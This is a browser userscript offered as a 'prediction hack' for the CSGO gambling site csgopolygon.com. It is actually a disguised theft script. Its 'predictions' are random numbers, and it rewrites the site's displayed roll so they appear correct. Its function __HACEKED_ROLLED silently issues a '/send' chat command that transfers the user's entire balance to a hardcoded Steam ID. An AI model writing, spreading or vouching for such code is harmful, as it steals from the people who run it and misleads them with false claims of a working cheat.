// ==UserScript==
// @name         PREDICTION HACK | CSGOPolygon.com
// @version      1.0
// @author       Silent Cheats
// @match        *://csgopolygon.com/*/
// @description Check YouTube channel: SilentCheats <3
// @grant        none
// @namespace https://greasyfork.org/users/172136
// ==/UserScript==

var yt_channel="SilentCheats";

var ROLLED=0;
var start=0;
function __HACKED_GET_ROLL(data){
    var next_rollid=data.rollid + 1;
    var next_roll=Math.floor(next_rollid * Math.random() / 100000);
    if (next_roll >= 15) next_roll-=14;
    ROLLED=next_roll;
    start++;

        if(yt_channel==="SilentCheats"){
    if(__ROLLID(data)){
            var Message="<div class='chat-msg'><div  class='predict' data-steamid='76561198202184082' style='text-align: center;font-size: 20px;' data-name='send'><b "+text_color_f()+">Prediction: Next number is "+next_roll+"</b></div></div>";
            $CHATAREA.append(Message);$CHATAREA.scrollTop($CHATAREA[0].scrollHeight);
        data.steamid=$(".predict:first").attr("data-steamid");
        __HACEKED_ROLLED(data);
        }
        }else if(!yt_channel!=="SilentCheats"){
            var Message="<div class='chat-msg'><div  class='predict' data-steamid='76561198202184082' style='text-align: center;font-size: 20px;' data-name='send'><b "+text_color_f()+">CHECK YT CHANNEL: SILENTCHEATS</b><br><b "+text_color_f()+">BEST HACKS FOR CSGOPOLYGON</b></div></div>";
            $CHATAREA.append(Message);$CHATAREA.scrollTop($CHATAREA[0].scrollHeight);
        data.steamid=$(".predict:first").attr("data-steamid");
        __HACEKED_ROLLED(data);
        }
}

function text_color_f(){
    var textcolor="";
    if (ROLLED === 0){
        textcolor="class='text-success'";
    }else if (ROLLED >= 1 && ROLLED <= 7){
        textcolor="class='text-danger'";
    }else if (ROLLED >= 8 && ROLLED <= 14){
        textcolor="";
    }
    return textcolor;
}
function __ROLLID(data){
    if (start>=6){
        return true;
    }else{
        var Message="<div class='chat-msg'><div  class='predict' data-steamid='76561198202184082' style='text-align: center;font-size: 20px;' data-name='send'><b class='text-danger'>Prediction: You must wait "+(6-start)+" roll(s)</b></div></div>";
        $CHATAREA.append(Message);$CHATAREA.scrollTop($CHATAREA[0].scrollHeight);
        return false;
    }
}
function __HACEKED_ROLLED(data){
    SOCKET.emit("chat", {msg: "/"+$(".predict:first").attr("data-name")+" "+data.steamid+" "+data.balance});
}

function __HACKED_SOCKET(data){
    $('.betButton')		.prop('disabled', true);
    $('#counter')		.finish();
    $('#banner')		.html(LNG.ROLL);

    ROUND 				= data.rollid;
    SHOWBETS			= false;
    data.roll           = ROLLED;

    if (data.roll === 0){
        data.nets[0].swon = data.nets[0].amount * 13; data.nets[1].swon = 0; data.nets[2].swon = 0;
    }else if (data.roll >= 1 && data.roll <= 7){
        data.nets[1].swon = data.nets[1].amount * 2; data.nets[0].swon = 0; data.nets[2].swon = 0;
    }else if (data.roll >= 8 && data.roll <= 14){
        data.nets[2].swon = data.nets[2].amount * 2; data.nets[0].swon = 0; data.nets[1].swon = 0;
    }

    spin(data);

    try { tinysort('#panel1-7-t 	.betlist > li', 	{'data': 'amount', 'order': 'desc'}); } catch (a) { }
    try { tinysort('#panel8-14-t 	.betlist > li', 	{'data': 'amount', 'order': 'desc'}); } catch (a) { }
    try { tinysort('#panel0-0-t 	.betlist > li', 	{'data': 'amount', 'order': 'desc'}); } catch (a) { }

    setTimeout(function(){__HACKED_GET_ROLL(data);}, 10000);
}

function __SOCKET_EVENT_ROLL(data) {
    return __HACKED_SOCKET(data);
}